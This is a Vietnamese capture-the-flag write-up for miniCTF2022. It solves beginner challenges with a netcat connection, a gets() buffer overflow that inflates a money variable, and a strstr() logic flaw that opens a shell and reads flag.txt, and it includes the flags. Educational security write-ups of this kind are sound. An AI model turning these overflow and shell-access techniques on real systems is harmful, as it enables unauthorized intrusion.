# Write Up miniCTF2022

# 1. NetCat

## Category
Warm Up - Halston

## Question
Can you connect the netcat ? 
>nc 174.138.21.217 3136

## Solution
Chúng ta sẽ kết nối vào `netcat` ngay lập tức flag sẽ hiện ra.

```
halston in ~ λ nc 174.138.21.217 3136
                              NETCAT
                            /\_____/\
                           /  o   o  \
                          ( ==  ^  == )
                          ))         (
                          (           )
                         ( (  )   (  ) )
                        (__(__)___(__)__)

Here your flag: ISPCTF{Th1s_1s_n3t_c4t}
```

## Flag
`ISPCTF{Th1s_1s_n3t_c4t}`

# 2. abcbof

## Category
Warm Up - Halston

## Question
>nc 174.138.21.217 3137

## Solution
Khi tải source code về ta có thể nhìn thấy có lỗi tại gets() vì khi nhập vào sẽ không kiểm soát số lượng kí tự được nhập
```
int main(){   
    long long money = 0;
    puts("==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================");
    puts("| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Thoát Game |  5. Tài Khoản |");
    puts("======================================================================================");
    puts("Hãy nhập tên người chơi:");
    char name[30];
    gets(name);
```
Vì vậy khi ta nhập 1 dãy thật dài thì chương trình sẽ ghi đè lên biến money và làm thay đổi giá trị của biến.
```
halston in ~ λ nc 174.138.21.217 3137



                                         I
                                      II   II
                                   II         II
                                ,I               II
                              I,       IIIIII       II
                           II       IIIIIIIIIIII       II
                        II       IIIIIIIIIIIIIIIIII#      II
                     II        IIIIIIIIIIIIIIIIIIIIIII       II
                  II        IIIIIIIIIII       IIIIIIII  II      II
           IIIIII            IIIIIII            IIIIII  IIIII      II
           IIIII        II    IIIIIII           IIIIII  IIIIIIII      II.
            #I      I   IIII    IIIIIII         IIIIII  IIIIIIIIIII     I
                 IIIII  IIIII    IIIIIIIII     .IIIIII  IIII   IIIII    I
        IIIII  IIIIIII   IIIIII    IIIIIIIII     IIIII  IIII    IIII    I
        IIIII  #IIIIII   IIIIII       IIIIIIIII      I  IIII   IIII    I
           I    IIIIIII   IIIIII  I     IIIIIIIIIII     IIIII# IIII    I
           I     IIIIII   IIIIIII  II      IIIIIIIIII  IIIIIIIIIII    II
            I    IIIIIII   IIIIIII  III#     IIIIIII   IIIIIIIIIII    I
            I     IIIIIII   IIIIIII  IIIII  IIIIIIII  IIIIIIIIIII    I
             I     IIIIIII   IIIIIII  IIII IIIIIIII   IIIIIIIIII    II
              I     IIIIIII   IIIIIII  II IIIIIIII#  IIIIIIIIII     I
               I     IIIIIII   IIIIIIII  IIIIIIIII  *IIIIII II     I
                I     IIIIIII   IIIIIIIIIIIIIIIII   IIIIII II     I
                 I     IIIIIII   IIIIIIIIIIIIIII   IIIII* II    #I
                  I      IIIIII    IIIIIIIIIIII   IIIII  I     II
                   I.     IIIIIII    IIIIIIIII   IIIII II     I
                     I      IIIIIII   IIIIII   IIIIII I      I
                      II      IIIIII    III   IIIII        I
                        II      IIIIII      IIIIII       II
                          II      IIIIII   IIIII       II
                            II      IIIIIIIIII       II
                               II                  I
                                 III            II
                                    #II     III
                                        III


Hãy nhập tên người chơi: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================
| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Tài Khoản | 5. Thoát Game |
======================================================================================

Hello �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, chào mừng bạn đến với Game Bài Uy Tín Top 1 Việt Nam !!!
Nhập lựa chọn của bạn:
4

Tài khoản của bạn có 7016996765293437281 $
```
Từ đó ta có thể mua flag
```
Nhập lựa chọn của bạn:
3

Tài khoản của bạn có 7016996765293437281 $
=====================FLAG=======================
|Bạn có muốn mua FLAG với giá 1 000 000 000 $  |
|----------------------------------------------|
|         1. YES      |         2. NO          |
================================================
Lựa chọn của bạn :
1


Chúc mừng bạn đã chiến thắng
Đây là Flag của bạn:
ISPCTF{B4s1c_Buff3r_0v3rFl0w}
```
## Flag
`ISPCTF{B4s1c_Buff3r_0v3rFl0w}`

# 3. RPS

## Category
Warm Up - I1igma

## Question
>nc 174.138.21.217 3138

## Solution
Đọc source code ta có thấy chương trình sử dụng `if (strstr(player_turn, loses[computer_turn]))` hàm strstr() để kiểm tra chuỗi người dùng nhập vào `player_turn` có 
trong chuỗi `loses[computer_turn]` máy tính thua không.
Nếu có sẽ trả về `true` từ đó ta có 1 lần chiến thắng.
```
if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
```
Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 6 lần để có thể chiến thắng.
```
 if (wins >= 6) {
        puts("Congrats!!!");
        system("/bin/sh");
	
      }
```
Chúng ta sẽ connect đến `netcat` để thực hiện 6 lần nhập sau đó khi chương trình gọi `/bin/sh` ta sẽ lấy được `shell`.
```
halston in ~ λ nc 174.138.21.217 3138
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Congrats!!!
ls
bin
chall
dev
flag.txt
ld.so
lib
lib32
lib64
libc.so.6
cat flag.xtt
cat: flag.xtt: No such file or directory
cat flag.txt
ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
```


## Flag
`ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`


# 4. Base64

## Category
Mics - Halston

## Question
QR-Code

## Solution
Quét mã QR ra được đoạn mã base64

- ![image](https://user-images.githubusercontent.com/91616280/197390779-a7211cb8-29c7-438b-944f-ace1c25af825.png)

- ![image](https://user-images.githubusercontent.com/91616280/197390839-b2715d5b-48a6-40f0-b6e0-6ce8c15fbb2d.png)

- ![image](https://user-images.githubusercontent.com/91616280/197390894-1a05d988-c2be-4daa-9691-b8ab75f4a80f.png)


## Flag
`ISPCTF{H4v3_4_G00D_D4y}`
